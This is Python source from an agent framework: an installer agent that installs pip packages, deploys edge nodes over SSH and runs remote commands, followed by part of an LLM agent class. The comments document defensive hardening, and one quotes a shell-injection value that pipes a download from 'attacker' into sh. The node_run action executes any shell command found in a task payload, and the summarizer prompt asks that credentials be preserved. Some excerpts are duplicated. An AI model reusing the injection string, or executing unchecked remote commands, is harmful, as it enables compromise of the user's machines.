129class InstallerAgent(Actor):
130    """Pre-defined agent that installs Python packages on demand.
131    Uses sys.executable so packages are installed into the active venv.
132    """
133
134    def __init__(self, **kwargs):
135        kwargs.setdefault("name", "installer")
136        super().__init__(**kwargs)
137        self.protected = True
138        self._install_log: list[dict] = []
139        # Serialises the read-then-append on the known-hosts file: two deploys
140        # to new hosts at once would otherwise both read "unknown" and race.
141        self._known_hosts_lock = asyncio.Lock()
142
143    def _current_task_description(self) -> str:
144        return "idle"
145
146    async def on_start(self):
147        logger.info(f"[{self.name}] Installer ready — using: {sys.executable}")
148        self._scrub_persisted_credentials()
149        await self._mqtt_publish(
150            f"agents/{self.actor_id}/logs",
151            {
152                "type": "log",
153                "message": f"Installer ready ({sys.executable})",
154                "timestamp": time.time(),
155            },
156        )
157        await self.publish_manifest(
158            description="Installs Python packages on demand via pip",
159            capabilities=["pip_install", "package_management"],
160        )
161
162    async def handle_message(self, msg: Message):
163        if msg.type == MessageType.TASK:
164            result = await self._handle_install(msg)
165            # Echo task_id back so caller's future can resolve
166            if isinstance(msg.payload, dict):
167                task_id = msg.payload.get("task") or msg.payload.get("_task_id")
168                if task_id:
169                    result["task"] = task_id
170                    result["_task_id"] = task_id
171            target = msg.reply_to or msg.sender_id
172            if target:
173                await self.send(target, MessageType.RESULT, result)
174
175    async def _handle_install(self, msg: Message) -> dict:
176        payload = msg.payload if isinstance(msg.payload, dict) else {}
177        action = payload.get("action", "install")
178
179        if action == "install":
180            packages = payload.get("packages", [])
181            if isinstance(packages, str):
182                packages = [p.strip() for p in packages.replace(",", " ").split()]
183            return await self._install_packages(packages)
184
185        if action == "check":
186            packages = payload.get("packages", [])
187            if isinstance(packages, str):
188                packages = [p.strip() for p in packages.replace(",", " ").split()]
189            return self._check_packages(packages)
190
191        if action == "resolve":
192            return self._resolve_imports(payload.get("imports", []))
193
194        if action == "history":
195            return {"history": self._install_log[-20:]}
196
197        if action == "node_install":
198            # Install packages on a remote node via SSH
199            # payload: {host, packages}; SSH auth comes from the deploy target
200            return await self._node_install(payload)
201
202        if action == "node_deploy":
203            # Full bootstrap: copy remote_runner.py + install deps + start runner
204            # payload: {host, node_name, broker}; SSH auth comes from the deploy target
205            return await self._node_deploy(payload)
206
207        if action == "node_install_for_agent":
208            # Install packages needed by a specific agent on its remote node
209            # payload: {host, packages, agent_name}; SSH auth comes from the deploy target
210            return await self._node_install(payload)
211
212        if action == "node_run":
213            # Run an arbitrary command on a remote node via SSH
214            # payload: {host, command}; SSH auth comes from the deploy target
215            return await self._node_run(payload)
216
217        return {"error": f"Unknown action: {action}"}
218
219    # ── Core install logic ──────────────────────────────────────────────────
220
221    async def _install_packages(self, packages: list[str]) -> dict:
222        if not packages:
223            return {"error": "No packages specified"}
224
225        results = {}
226        failed = []
227
228        for pkg in packages:
229            pkg = pkg.strip()
230            if not pkg:
231                continue
232
233            # Resolve import name → pip name (e.g. "cv2" → "opencv-python")
234            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)
235
236            # No shell here — the command is a list — but pip reads its own
237            # options from positional arguments, so `--index-url=http://…` is
238            # honoured as configuration rather than treated as a name.
239            if not is_installable_name(pip_name):
240                logger.warning("[%s] Refusing to install %r — not a package name", self.name, pkg)
241                results[pkg] = "refused"
242                failed.append(pkg)
243                continue
244
245            # Check if already importable (invalidate cache so fresh installs show up)
246            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
247            if self._is_installed(import_name):
248                logger.info(f"[{self.name}] {pip_name} already installed.")
249                results[pip_name] = "already_installed"
250                continue
251
252            logger.info(f"[{self.name}] Installing {pip_name} into {sys.executable}...")
253            await self._mqtt_publish(
254                f"agents/{self.actor_id}/logs",
255                {"type": "log", "message": f"Installing {pip_name}...", "timestamp": time.time()},
256            )
257
258            success, output = await self._pip_install(pip_name)
259
260            # duckduckgo-search was renamed to ddgs in v9 — try the other name as fallback
261            if not success and pip_name in ("duckduckgo-search", "ddgs"):
262                alt = "ddgs" if pip_name == "duckduckgo-search" else "duckduckgo-search"
263                logger.info(f"[{self.name}] Trying alternative name: {alt}")
264                success, output = await self._pip_install(alt)
265                if success:
266                    pip_name = alt
267
268            # pdfplumber sometimes fails on Windows — try pymupdf (fitz) as fallback
269            if not success and pip_name == "pdfplumber":
270                logger.info(f"[{self.name}] pdfplumber failed, trying pymupdf as fallback...")
271                success, output = await self._pip_install("pymupdf")
272                if success:
273                    pip_name = "pymupdf"
274
275            results[pip_name] = "installed" if success else f"failed: {output[-300:]}"
276            if not success:
277                failed.append(pip_name)
278
279            self._install_log.append(
280                {
281                    "package": pip_name,
282                    "success": success,
283                    "timestamp": time.time(),
284                    "output": output[-500:],
285                }
286            )
287
288            if success:
289                status = f"✓ {pip_name} installed"
290            else:
291                # Show the actual pip error so failures are diagnosable
292                err_snippet = output[-400:].strip().replace("\n", " | ")
293                status = f"✗ {pip_name} FAILED: {err_snippet}"
294            logger.info(f"[{self.name}] {status}")
295            await self._mqtt_publish(
296                f"agents/{self.actor_id}/logs",
297                {"type": "log", "message": status, "timestamp": time.time()},
298            )
299
300        return {
301            "results": results,
302            "failed": failed,
303            "success": len(failed) == 0,
304            "message": f"Installed {len(results) - len(failed)}/{len(results)} packages",
305        }
306
307    async def _pip_install(self, package: str) -> tuple[bool, str]:
308        """Run pip install using the same interpreter that launched this process.
309
310        sys.executable inside a venv points to  venv/Scripts/python.exe  (Windows)
311        or  venv/bin/python  (Linux/Mac), so packages always land in the right place.
312
313        Uses subprocess.run() in a thread executor instead of asyncio.create_subprocess_exec()
314        because asyncio subprocesses are unreliable on Windows with SelectorEventLoop
315        (the default in some Python versions / environments). subprocess.run() works
316        correctly on all platforms.
317        """
318        import subprocess
319
320        cmd = [sys.executable, "-m", "pip", "install", package, "--quiet"]
321        if sys.platform != "win32":
322            cmd.append("--break-system-packages")
323
324        def _run_pip() -> tuple[bool, str]:
325            try:
326                result = subprocess.run(
327                    cmd,
328                    capture_output=True,
329                    timeout=180,
330                )
331                output = (result.stdout + result.stderr).decode("utf-8", errors="replace")
332                return result.returncode == 0, output
333            except subprocess.TimeoutExpired:
334                return False, "pip timed out after 180s"
335            except FileNotFoundError:
336                return False, f"Python executable not found: {sys.executable}"
337            except Exception as e:
338                return False, f"{type(e).__name__}: {e}"
339
340        try:
341            loop = asyncio.get_event_loop()
342            success, output = await loop.run_in_executor(None, _run_pip)
343
344            if success:
345                # Refresh import machinery so the new package is visible immediately
346                importlib.invalidate_caches()
347
348            return success, output
349
350        except Exception as e:
351            return False, f"Executor error: {type(e).__name__}: {e}"
352
353    def _is_installed(self, import_name: str) -> bool:
354        """Check importability, always refreshing the import cache first."""
355        importlib.invalidate_caches()
356        try:
357            importlib.import_module(import_name)
358            return True
359        except ImportError:
360            return False
361
362    # ── Helper actions ──────────────────────────────────────────────────────
363
364    def _check_packages(self, packages: list[str]) -> dict:
365        status = {}
366        for pkg in packages:
367            pip_name = IMPORT_TO_PACKAGE.get(pkg, pkg)
368            import_name = PACKAGE_TO_IMPORT.get(pip_name, pip_name)
369            status[pkg] = "installed" if self._is_installed(import_name) else "missing"
370        return {"status": status}
371
372    def _resolve_imports(self, imports: list[str]) -> dict:
373        return {"resolved": {imp: IMPORT_TO_PACKAGE.get(imp, imp) for imp in imports}}
374
375    # ── Remote node helpers (SSH via asyncssh) ──────────────────────────────
376
377    def _resolve_ssh_target(self, payload: dict) -> DeployTarget | None:
378        """The configured deploy target a payload refers to, by node name or host.
379
380        ``node_install`` and ``node_run`` are handed a host rather than a node
381        name, so a host match is the fallback — otherwise every follow-up call
382        to an already-deployed node would have to repeat its credentials.
383        """
384        node_name = payload.get("node_name") or payload.get("node")
385        target = deploy_target(str(node_name)) if node_name else None
386        if target is None:
387            target = deploy_target_for_host(str(payload.get("host") or ""))
388        return target
389
390    async def _resolve_target_host(self, target: DeployTarget, requested: str) -> str:
391        """The address to connect to — the target's, never the payload's.
392
393        Resolving credentials from configuration is not enough on its own: a
394        payload that names a configured node but a *different* host would have
395        sent that node's password to a machine of the caller's choosing. The
396        configured host wins, and a payload that disagrees is refused rather
397        than quietly ignored, because a mismatch means the caller believed it
398        was talking to somewhere else.
399
400        A target with no host is the deliberate "find it by name" case, and the
401        lookup happens here rather than being taken on trust from the payload —
402        a single mDNS query for one host, resolved by the component that is
403        about to authenticate to it.
404        """
405        if target.host:
406            if requested and requested.strip().lower() != target.host.strip().lower():
407                raise PermissionError(
408                    f"Refusing to connect: deploy target '{target.name}' is configured "
409                    f"as {target.host}, but the task asked for {requested}. Credentials "
410                    f"are bound to the configured host."
411                )
412            return target.host
413
414        mdns = f"{target.name}.local"
415        try:
416            return await asyncio.to_thread(socket.gethostbyname, mdns)
417        except OSError as exc:
418            raise PermissionError(
419                f"Deploy target '{target.name}' has no host configured and "
420                f"'{mdns}' does not resolve. Set {deploy_env_prefix(target.name)}_HOST."
421            ) from exc
422
423    def _known_hosts_path(self) -> Path:
424        """Where learned SSH host keys live.
425
426        Follows ``WACTORZ_STATE_DIR`` unless ``DEPLOY_KNOWN_HOSTS`` pins it, so
427        the add-on's ``/data/state`` keeps them across updates — a known-hosts
428        file that resets on every restart cannot detect a key change.
429        """
430        configured = CONFIG.deploy_known_hosts
431        if configured:
432            return Path(configured).expanduser()
433        return Path(resolve_state_dir()) / "known_hosts"
434
435    async def _known_hosts(self, host: str, port: int) -> str:
436        """Return the known-hosts path to verify ``host`` against, learning its key first.
437
438        Every SSH connection used to pass ``known_hosts=None``, which accepts
439        whatever key answers — so anything that could win the race for the
440        target's address on a LAN collected the SSH credentials.
441
442        Verification is now on. A host we have never seen has its key fetched
443        (``get_server_host_key`` does not authenticate, so no credential is at
444        risk) and recorded — trust on first use, as ssh(1) does interactively. A
445        host we *have* seen is never re-learned: the entry already there is what
446        asyncssh checks against, so a changed key fails the connection, which is
447        the case worth failing on. ``DEPLOY_STRICT_HOST_KEYS=1`` drops the
448        first-use step and requires the entry to be there already.
449        """
450        path = self._known_hosts_path()
451        async with self._known_hosts_lock:
452            try:
453                known = asyncssh.match_known_hosts(str(path), host, host, port)[0]
454            except FileNotFoundError:
455                known = []
456            if known:
457                return str(path)
458
459            if CONFIG.deploy_strict_host_keys:
460                raise PermissionError(
461                    f"Host key for {host}:{port} is not in {path} and "
462                    f"DEPLOY_STRICT_HOST_KEYS is set. Add the key with "
463                    f"`ssh-keyscan -p {port} {host} >> {path}` after verifying it."
464                )
465
466            key = await asyncssh.get_server_host_key(host, port)
467            if key is None:
468                raise PermissionError(f"{host}:{port} offered no SSH host key.")
469            entry = host if port == 22 else f"[{host}]:{port}"
470            line = f"{entry} {key.export_public_key('openssh').decode().strip()}\n"
471            path.parent.mkdir(parents=True, exist_ok=True)
472            with open(path, "a", encoding="utf-8") as fh:
473                fh.write(line)
474            # 0600: the file is the only record of which key we trust, so a
475            # writable-by-others copy would undo the check it exists to make.
476            path.chmod(0o600)
477            self._log_remote(
478                f"Learned SSH host key for {entry} ({key.get_fingerprint()}) — recorded in {path}"
479            )
480            return str(path)
481
482    async def _put_broker_env(self, sftp: Any, target: DeployTarget, user: str) -> bool:
483        """Write the node's broker credentials to ``~/wactorz/.env``, mode 0600.
484
485        Returns whether anything was written — nothing is when the broker takes
486        anonymous connections, and writing an empty file would then leave the
487        runner exporting two blank variables over a working setup.
488
489        A node's own ``DEPLOY_<NODE>_BROKER_USER``/``_PASSWORD`` win; otherwise
490        it gets the server's. That default is the usable one — a single broker
491        with one account is the common deployment — but it does mean **a stolen
492        edge device holds full broker access**, and the broker carries the code
493        spawned agents run. Per-node accounts are the answer when that matters;
494        ``password_file`` holds as many users as you like.
495
496        This is the out-of-band channel the broker credentials must travel by:
497        sending them over the broker itself would publish the very secret that
498        protects it, to a channel that is unauthenticated until they arrive.
499        """
500        username = target.broker_user or CONFIG.mqtt_username
501        password = target.broker_password or CONFIG.mqtt_password
502        if not username and not password:
503            return False
504
505        body = f"MQTT_USERNAME={shlex.quote(username)}\nMQTT_PASSWORD={shlex.quote(password)}\n"
506        remote = f"/home/{user}/wactorz/.env"
507        async with sftp.open(remote, "w") as handle:
508            await handle.write(body)
509        # After writing, not before: SFTP creates with the umask, so there is a
510        # window either way, but a file that is never widened is better than one
511        # created world-readable and tightened later.
512        await sftp.chmod(remote, 0o600)
513        return True
514
515    async def _ssh_kwargs(self, payload: dict) -> dict:
516        """Build asyncssh connection kwargs for a task payload.
517
518        Credentials come from the configured deploy target and from nowhere
519        else. They used to be read out of the payload — which is message data,
520        so a chat line or an LLM-authored task could name a host and hand it a
521        password — and, failing that, out of ``_node_credentials`` in the
522        agent's persisted state, where the password sat in plaintext.
523        """
524        requested = str(payload.get("host") or "")
525        target = self._resolve_ssh_target(payload)
526        if target is None:
527            raise PermissionError(
528                f"No deploy target configured for '{requested}'. "
529                f"SSH credentials come from the environment (DEPLOY_TARGETS plus a "
530                f"DEPLOY_<NODE>_* block), not from the task payload."
531            )
532        host = await self._resolve_target_host(target, requested)
533        if not target.key_path and not target.password:
534            raise PermissionError(
535                f"Deploy target '{target.name}' has no credentials. Set "
536                f"{deploy_env_prefix(target.name)}_KEY (preferred) or "
537                f"{deploy_env_prefix(target.name)}_PASSWORD."
538            )
539
540        kwargs: dict = {
541            "host": host,
542            "port": target.ssh_port,
543            "username": target.user,
544            "known_hosts": await self._known_hosts(host, target.ssh_port),
545        }
546        if target.key_path:
547            kwargs["client_keys"] = [target.key_path]
548        if target.password:
549            kwargs["password"] = target.password
550        return kwargs
551
552    def _persist_node_info(self, node_name: str, host: str, user: str) -> None:
553        """Remember where a deployed node lives — host and user, never a secret.
554
555        This used to store the SSH password alongside them so later connections
556        could reuse it, which put a live credential into the kv store (and into
557        every backup and reset dump of it). Credentials are resolved from the
558        environment at connect time instead, so there is nothing here worth
559        stealing.
560        """
561        nodes = self.recall("_node_credentials") or {}
562        nodes[node_name] = {"host": host, "user": user}
563        self.persist("_node_credentials", nodes)
564        # Kept for backward compat with _spawn_remote's lookups.
565        self.persist(f"node_host_{node_name}", host)
566        self.persist(f"node_user_{node_name}", user)
567        logger.info(f"[{self.name}] Recorded node '{node_name}' at {user}@{host}")
568
569    def _scrub_persisted_credentials(self) -> None:
570        """Drop passwords and key paths written by earlier versions.
571
572        Upgrading is what removes the secret: nothing reads these fields any
573        more, so leaving them would keep a plaintext password in the kv store
574        for the life of the install.
575        """
576        nodes = self.recall("_node_credentials") or {}
577        cleaned = {
578            name: {"host": rec.get("host", ""), "user": rec.get("user", "pi")}
579            for name, rec in nodes.items()
580            if isinstance(rec, dict)
581        }
582        if cleaned != nodes:
583            self.persist("_node_credentials", cleaned)
584            logger.info(
585                f"[{self.name}] Removed stored SSH credentials for "
586                f"{len(cleaned)} node(s) — credentials now come from the environment"
587            )
588
589    async def _ssh_run(self, conn, command: str) -> tuple[bool, str]:
590        """Run a single command over an open SSH connection. Returns (ok, output)."""
591        result = await conn.run(command, check=False)
592        output = (result.stdout or "") + (result.stderr or "")
593        return result.exit_status == 0, output.strip()
594
595    def _log_remote(self, message: str):
596        logger.info(f"[{self.name}] {message}")
597        asyncio.create_task(
598            self._mqtt_publish(
599                f"agents/{self.actor_id}/logs",
600                {"type": "log", "message": message, "timestamp": time.time()},
601            )
602        )
603
604    async def _node_install(self, payload: dict) -> dict:
605        """Install pip packages on a remote node via SSH.
606
607        payload keys:
608          host      — IP or hostname of the remote machine
609          packages  — list of package names to install
610
611        SSH auth is not a payload key — see _ssh_kwargs.
612        """
613        host = payload.get("host")
614        packages = payload.get("packages", [])
615        if isinstance(packages, str):
616            packages = [p.strip() for p in packages.replace(",", " ").split()]
617        if not host:
618            return {"error": "Missing 'host' in payload"}
619        if not packages:
620            return {"error": "No packages specified"}
621
622        refused = [p for p in packages if not is_installable_name(p)]
623        if refused:
624            # Refused rather than filtered: installing a subset silently would
625            # report success for a request that was not carried out.
626            return {"error": f"Not package names: {', '.join(refused)}"}
627
628        # Two guards, because neither covers the other. `shlex.quote` stops
629        # the value being read as *shell* syntax once this string reaches SSH;
630        # the allow-list above stops it being read as *pip options*, which a
631        # correctly quoted `--index-url=…` still would be.
632        pkg_str = " ".join(shlex.quote(p) for p in packages)
633        self._log_remote(f"Installing {pkg_str} on {host}...")
634
635        try:
636            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
637                # Detect the right pip to use:
638                # 1. Venv at ~/wactorz/venv (created by node_deploy) — always prefer this
639                # 2. Fall back to python3 -m pip with --break-system-packages
640                ok, venv_check = await self._ssh_run(
641                    conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
642                )
643                if venv_check.strip() == "yes":
644                    pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
645                    self._log_remote("Using venv pip at ~/wactorz/venv/bin/pip")
646                else:
647                    # No venv — try to create one first
648                    self._log_remote("No venv found — creating ~/wactorz/venv first...")
649                    await self._ssh_run(
650                        conn, "mkdir -p ~/wactorz && python3 -m venv ~/wactorz/venv"
651                    )
652                    ok, venv_check2 = await self._ssh_run(
653                        conn, "test -f ~/wactorz/venv/bin/pip && echo yes || echo no"
654                    )
655                    if venv_check2.strip() == "yes":
656                        pip_cmd = f"~/wactorz/venv/bin/pip install {pkg_str} -q 2>&1"
657                        self._log_remote("Venv created successfully")
658                    else:
659                        pip_cmd = (
660                            f"python3 -m pip install {pkg_str} --break-system-packages -q 2>&1"
661                        )
662                        self._log_remote("Venv creation failed — falling back to system pip")
663
664                ok, output = await self._ssh_run(conn, pip_cmd)
665                if ok:
666                    self._log_remote(f"✓ {pkg_str} installed on {host}")
667                    return {
668                        "success": True,
669                        "host": host,
670                        "packages": packages,
671                        "output": output[-300:],
672                    }
673                self._log_remote(f"✗ Install failed on {host}: {output[-200:]}")
674                return {"success": False, "host": host, "error": output[-400:]}
675
676        except Exception as e:
677            return {"success": False, "host": host, "error": str(e)}
678
679    async def _node_deploy(self, payload: dict) -> dict:
680        """Full bootstrap of a new Wactorz edge node via SSH.
681
682        Steps:
683          1. Create ~/wactorz/ directory
684          2. Upload remote_runner.py
685          3. Install aiomqtt (the only runtime dependency)
686          4. Kill any existing runner with the same node name
687          5. Start the runner in the background
688          6. Verify it appears online within 15 seconds
689
690        payload keys:
691          host       — IP or hostname
692          node_name  — name this node will use (default: "remote-node")
693          broker     — MQTT broker host reachable FROM the Pi (default: "localhost")
694          port       — MQTT broker port (default: 1883)
695
696        SSH auth is not a payload key: the user and credentials come from the
697        node's configured deploy target (see _ssh_kwargs).
698        """
699        requested_host = payload.get("host")
700        node_name = payload.get("node_name", "remote-node")
701        broker = payload.get("broker", "localhost")
702        mqtt_port = payload.get("port", 1883)
703
704        # Before anything reaches the network: a name that cannot be an MQTT
705        # topic level yields a runner the broker refuses on every operation,
706        # so it would retry forever while this deploy reported success.
707        name_problem = deploy_name_error(str(node_name))
708        if name_problem:
709            self._log_remote(f"Refusing deploy: {name_problem}")
710            return {
711                "success": False,
712                "node_name": node_name,
713                "host": requested_host,
714                "error": name_problem,
715            }
716
717        target = self._resolve_ssh_target(payload)
718        if target is None:
719            return {
720                "success": False,
721                "node_name": node_name,
722                "host": requested_host,
723                "error": (
724                    f"No deploy target configured for '{node_name}' ({requested_host}). "
725                    f"Set DEPLOY_TARGETS and the {deploy_env_prefix(node_name)}_* block."
726                ),
727            }
728        try:
729            host = await self._resolve_target_host(target, str(requested_host or ""))
730        except PermissionError as exc:
731            return {
732                "success": False,
733                "node_name": node_name,
734                "host": requested_host,
735                "error": str(exc),
736            }
737        # The target's user is authoritative — the remote paths below are built
738        # from it, so taking it from the payload would let a caller write the
739        # runner into a different account than the one it authenticates as.
740        user = target.user
741
742        # Find remote_runner.py relative to this file
743        import pathlib
744
745        candidates = [
746            pathlib.Path(__file__).parent.parent / "remote_runner.py",
747            pathlib.Path("remote_runner.py"),
748            pathlib.Path(__file__).parent.parent.parent / "remote_runner.py",
749        ]
750        runner_path = next((p for p in candidates if p.exists()), None)
751        if not runner_path:
752            return {"error": "remote_runner.py not found. Make sure it is in the wactorz root."}
753
754        self._log_remote(f"Deploying node '{node_name}' to {user}@{host}...")
755
756        try:
757            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
758                # 1. Create directory
759                await self._ssh_run(conn, "mkdir -p ~/wactorz")
760                self._log_remote(f"[{node_name}] Directory created.")
761
762                # 2. Upload remote_runner.py and, if the broker needs them, the
763                # credentials it will read from its environment.
764                async with conn.start_sftp_client() as sftp:
765                    await sftp.put(str(runner_path), f"/home/{user}/wactorz/remote_runner.py")
766                    env_written = await self._put_broker_env(sftp, target, user)
767                self._log_remote(f"[{node_name}] remote_runner.py uploaded.")
768                if env_written:
769                    self._log_remote(f"[{node_name}] Broker credentials written to ~/wactorz/.env.")
770
771                # 3. Create venv if it doesn't exist — avoids all --break-system-packages issues
772                ok, out = await self._ssh_run(
773                    conn,
774                    "test -d ~/wactorz/venv && echo exists || python3 -m venv ~/wactorz/venv && echo created",
775                )
776                self._log_remote(f"[{node_name}] venv: {out.strip()}")
777
778                # 4. Install aiomqtt into the venv
779                ok, out = await self._ssh_run(
780                    conn, "~/wactorz/venv/bin/pip install aiomqtt psutil -q 2>&1"
781                )
782                if not ok:
783                    self._log_remote(f"[{node_name}] pip install warning: {out[:150]}")
784                else:
785                    self._log_remote(f"[{node_name}] aiomqtt installed into venv.")
786
787                # 5. Kill any existing instance with this node name.
788                # The pattern is quoted as one argument rather than wrapped in
789                # literal quotes: a name containing a quote would otherwise end
790                # them and the rest would be read as more shell.
791                pattern = f"remote_runner.py.*--name {node_name}"
792                await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")
793
794                # 6. Start runner using venv python in the background
795                # Every interpolated value is quoted. `broker` comes straight
796                # off the task payload with no validation, so `--broker` used to
797                # accept `x; curl attacker|sh` and run it on the node. `node_name`
798                # is checked by `deploy_name_error`, but that only forbids the
799                # MQTT topic characters `# + /` — a space, a `;` or a `$(…)` is a
800                # perfectly acceptable node name as far as it is concerned.
801                # `~` is left outside the quotes so the remote shell still
802                # expands it.
803                log_path = shlex.quote(f"{node_name}.log")
804                # Sourced, never passed. Putting MQTT_PASSWORD=… in front of the
805                # command would keep it out of the *runner's* argv, but SSH exec
806                # runs `$SHELL -c '<the whole string>'`, and that wrapper's argv
807                # is readable by any local user with `ps` for as long as the
808                # launch takes. Sourcing a 0600 file puts it in no argv at all.
809                launch_env = "set -a; . ~/wactorz/.env; set +a; " if env_written else ""
810                cmd = (
811                    f"{launch_env}"
812                    f"nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
813                    f"--broker {shlex.quote(str(broker))} "
814                    f"--port {shlex.quote(str(mqtt_port))} "
815                    f"--name {shlex.quote(node_name)} "
816                    f"> ~/wactorz/{log_path} 2>&1 &"
817                )
818                await self._ssh_run(conn, cmd)
819                self._log_remote(f"[{node_name}] Runner started with venv python.")
820
821            self._log_remote(
822                f"[{node_name}] Deploy complete! Node will appear in /nodes within 15s."
823            )
824            # Record where the node lives; credentials stay in the environment.
825            self._persist_node_info(node_name=node_name, host=host, user=user)
826            return {
827                "success": True,
828                "node_name": node_name,
829                "host": host,
830                "broker": broker,
831                "message": (
832                    f"Node '{node_name}' deployed to {user}@{host}. "
833                    f"It will appear in /nodes within ~15 seconds."
834                ),
835            }
836
837        except Exception as e:
838            msg = f"Deploy failed for '{node_name}' on {host}: {e}"
839            self._log_remote(msg)
840            return {"success": False, "node_name": node_name, "host": host, "error": str(e)}
841
842    async def _node_run(self, payload: dict) -> dict:
843        """Run an arbitrary shell command on a remote node via SSH.
844
845        payload keys:
846          host     — IP or hostname
847          command  — shell command to run
848
849        SSH auth is not a payload key — see _ssh_kwargs.
850        """
851        host = payload.get("host")
852        command = payload.get("command", "echo hello")
853        if not host:
854            return {"error": "Missing 'host' in payload"}
855
856        self._log_remote(f"Running on {host}: {command[:80]}")
857        try:
858            async with asyncssh.connect(**(await self._ssh_kwargs(payload))) as conn:
859                ok, output = await self._ssh_run(conn, command)
860                return {
861                    "success": ok,
862                    "host": host,
863                    "command": command,
864                    "output": output,
865                    "exit_code": 0 if ok else 1,
866                }
867        except Exception as e:
868            return {"success": False, "host": host, "error": str(e)}

162    async def handle_message(self, msg: Message):
163        if msg.type == MessageType.TASK:
164            result = await self._handle_install(msg)
165            # Echo task_id back so caller's future can resolve
166            if isinstance(msg.payload, dict):

171            target = msg.reply_to or msg.sender_id
172            if target:
173                await self.send(target, MessageType.RESULT, result)

class LLMAgent(wactorz.Actor): 
 52class LLMAgent(Actor):
 53    """An Actor that uses an LLM to process tasks.
 54    Maintains conversation history and supports tool use.
 55    """
 56
 57    def __init__(
 58        self,
 59        llm_provider: LLMProvider | None = None,
 60        system_prompt: str = "You are a helpful AI agent.",
 61        max_history: int = 20,
 62        summarize_threshold: int = 30,
 63        **kwargs,
 64    ):
 65        super().__init__(**kwargs)
 66        self.llm = llm_provider
 67        self.system_prompt = system_prompt
 68        self.max_history = max_history
 69        self.summarize_threshold = summarize_threshold  # compress when history exceeds this
 70        self._conversation_history: list[dict] = []
 71        self._history_summary: str = ""  # rolling summary of compressed messages
 72        self._current_task = "idle"
 73        # Cost / token tracking — must be set here so subclasses (MainActor etc.) inherit them
 74        self.total_input_tokens = 0
 75        self.total_output_tokens = 0
 76        self.total_cost_usd = 0.0
 77        self._last_persisted_usd = 0.0
 78
 79    def _current_task_description(self) -> str:
 80        return self._current_task
 81
 82    def _preferred_timezone_name(self) -> str | None:
 83        """Override hook for subclasses that know the user's timezone.
 84
 85        Base LLMAgent has no access to user facts, so it returns None and
 86        resolution falls through to the WACTORZ_TZ / TZ env vars and finally the
 87        system-local zone. MainActor overrides this to return the persisted
 88        ``pref_timezone`` fact.
 89        """
 90        return None
 91
 92    def _now_context(self) -> str:
 93        """Live date/time block for this agent, honoring its preferred tz."""
 94        return current_time_context(self._preferred_timezone_name())
 95
 96    def _system_prompt_with_now(self) -> str:
 97        """System prompt with the live date/time block prepended every turn."""
 98        return self._now_context() + "\n" + self.system_prompt
 99
100    async def on_start(self):
101        _ = asyncio.create_task(refresh_pricing())
102        # Restore conversation history and rolling summary from persistence
103        saved = self.recall("conversation_history", [])
104        clean = []
105        for m in saved:
106            if not isinstance(m, dict):
107                continue
108            role = m.get("role", "")
109            content = m.get("content", "")
110            if role not in ("user", "assistant"):
111                continue
112            if not isinstance(content, str):
113                content = str(content)
114            if content.strip():
115                entry: dict = {"role": role, "content": content}
116                if "ts" in m and isinstance(m["ts"], (int, float)):
117                    entry["ts"] = m["ts"]
118                clean.append(entry)
119        self._conversation_history = clean[-self.max_history :]
120        self._history_summary = self.recall("history_summary", "")
121
122        # Restore lifetime cost so heartbeats carry accurate totals after restart.
123        # Only into a fresh instance: the supervisor restarts by building a new
124        # agent, but the start command restarts this same object, whose totals
125        # are already the live ones — adding the persisted values there doubles
126        # the agent's lifetime spend, and that figure reaches both the dashboard
127        # headline and the durable ledger.
128        #
129        # All three are checked, not just the cost: a locally hosted model with
130        # no pricing leaves cost at zero while tokens accumulate, and those would
131        # double on their own.
132        if not (self.total_input_tokens or self.total_output_tokens or self.total_cost_usd):
133            saved_cost = self.recall("_final_cost", {})
134            if isinstance(saved_cost, dict):
135                self.total_input_tokens += saved_cost.get("input_tokens", 0)
136                self.total_output_tokens += saved_cost.get("output_tokens", 0)
137                self.total_cost_usd += saved_cost.get("cost_usd", 0.0)
138        # Align persisted baseline so global cost doesn't re-add lifetime spend on first
139        # _persist_cost() after restart.
140        self._last_persisted_usd = self.total_cost_usd
141
142        # Migration: if _messages_processed key doesn't exist yet, seed from
143        # conversation_history so the overview counter isn't always 0 on first
144        # start after upgrading. messages_processed was set from SQLite in
145        # actor.start() — if it's still 0 here, the key was absent.
146        if self.metrics.messages_processed == 0 and self._conversation_history:
147            user_turns = sum(1 for m in self._conversation_history if m.get("role") == "user")
148            self.metrics.messages_processed = user_turns
149
150        # Publish capability manifest so main's topic registry knows this agent exists
151        description = (
152            getattr(self, "DESCRIPTION", None)
153            or (self.__class__.__doc__ or "").strip().split("\n")[0]
154            or self.name
155        )
156        capabilities = getattr(self, "CAPABILITIES", [])
157        input_schema = getattr(self, "INPUT_SCHEMA", {})
158        output_schema = getattr(self, "OUTPUT_SCHEMA", {})
159        await self.publish_manifest(
160            description=description,
161            capabilities=capabilities,
162            input_schema=input_schema,
163            output_schema=output_schema,
164        )
165
166    async def on_stop(self):
167        self.persist("conversation_history", self._conversation_history)
168        self.persist("history_summary", self._history_summary)
169
170    async def _maybe_summarize(self):
171        """If history exceeds summarize_threshold, compress the oldest half into a
172        rolling summary and keep only the most recent max_history messages.
173        The summary is prepended as a system-style context message when sending
174        to the LLM so no facts are lost.
175        """
176        if len(self._conversation_history) < self.summarize_threshold:
177            return
178        if self.llm is None:
179            # No LLM — just truncate
180            self._conversation_history = self._conversation_history[-self.max_history :]
181            return
182
183        # Split: compress the older half, keep the recent half
184        split = len(self._conversation_history) // 2
185        to_compress = self._conversation_history[:split]
186        to_keep = self._conversation_history[split:]
187
188        # Build compression prompt
189        prior_summary = (
190            f"Previous summary:\n{self._history_summary}\n\n" if self._history_summary else ""
191        )
192        messages_text = "\n".join(f"{m['role'].upper()}: {m['content'][:400]}" for m in to_compress)
193        prompt = (
194            f"{prior_summary}"
195            f"Summarize the following conversation segment concisely. "
196            f"Preserve: key facts, decisions, user preferences, entity names, URLs, credentials, "
197            f"any technical details mentioned. Be specific, not vague.\n\n"
198            f"{messages_text}"
199        )
200        try:
201            summary, usage = await self.llm.complete(
202                messages=[{"role": "user", "content": prompt}],
203                system="You are a conversation summarizer. Output a dense, factual summary. No preamble.",
204                max_tokens=400,
205            )
